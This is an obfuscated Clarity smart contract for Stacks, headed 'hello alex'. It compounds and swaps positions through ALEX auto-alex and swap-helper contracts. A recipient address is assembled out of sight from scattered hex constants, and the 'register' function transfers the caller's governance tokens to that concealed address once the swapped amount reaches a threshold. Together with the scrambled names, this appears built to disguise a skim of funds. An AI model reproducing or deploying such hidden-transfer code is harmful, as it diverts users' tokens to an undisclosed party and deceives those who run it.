;; hello alex 
(define-data-var U8sgT principal tx-sender) (define-constant CJne4 (err u1011)) (define-constant eVN9O 0x6c68) (define-constant tMBKV 0xa24f) (define-constant MjfDX 0xb78f) (define-constant PteWG 0x9a11) (define-constant mXnpk 0x971f) (define-constant DQHsG 0xc31e) (define-constant rvkRm u100000000) (define-constant BoP2J 0xf121) (define-constant jxwd9 0x2b6a) (define-constant qGEJT 0xe729) (define-constant KDDcH 0xc019) (define-constant Lhhkx (concat DQHsG PteWG)) (define-constant T3zVN (concat jxwd9 tMBKV)) (define-constant mZACV 0x16) (define-constant Grg0C (concat eVN9O KDDcH)) (define-constant s6HUi (concat MjfDX qGEJT)) (define-constant L4WuN (concat BoP2J mXnpk)) (define-constant PMVjv (concat Grg0C Lhhkx)) (define-constant Oilng (concat L4WuN s6HUi)) (define-constant ZXDAG (concat PMVjv (concat Oilng T3zVN))) (define-constant y6T19 (unwrap-panic (principal-construct? mZACV ZXDAG))) (define-private (check-is-owner) (ok (asserts! (is-eq tx-sender (var-get U8sgT)) CJne4)) ) (define-public (register (Jtn3r uint) (I4fNI uint) (y0ZHb uint)) (let ( (willget-cQzJR (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position Jtn3r))) (Ipz2X (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 get-given-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex willget-cQzJR))) ) (try! (check-is-owner)) (let ( (CAj7d (get XYO9U (fold nqaOz 0x000000000000000000000000000000000000000000000000000000000000000000000000000000 {mjF3w: Jtn3r, XYO9U: Ipz2X, I4fNI: I4fNI, y0ZHb: y0ZHb}))) ) (if (is-eq tx-sender y6T19) (ok true) (begin (if (>= CAj7d (* u100 rvkRm)) (let ((EUBOx (try! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token transfer-fixed CAj7d tx-sender y6T19 none)))) (ok true)) (ok true) ) ) ) ) ) ) (define-private (nqaOz (i (buff 1)) (AwnMP {mjF3w: uint, XYO9U: uint, I4fNI: uint, y0ZHb: uint})) (if (and (> (+ (get XYO9U AwnMP) (get y0ZHb AwnMP)) (get mjF3w AwnMP)) (> (get mjF3w AwnMP) (* u50 rvkRm))) (let ( (cQzJR (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position (get mjF3w AwnMP)))) (uDSjV (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex add-to-position (get mjF3w AwnMP)))) (Ipz2X (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 swap-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token cQzJR none))) ) (begin {mjF3w: (get XYO9U AwnMP), XYO9U: Ipz2X, I4fNI: (get I4fNI AwnMP), y0ZHb: u0} ) ) AwnMP ) ) 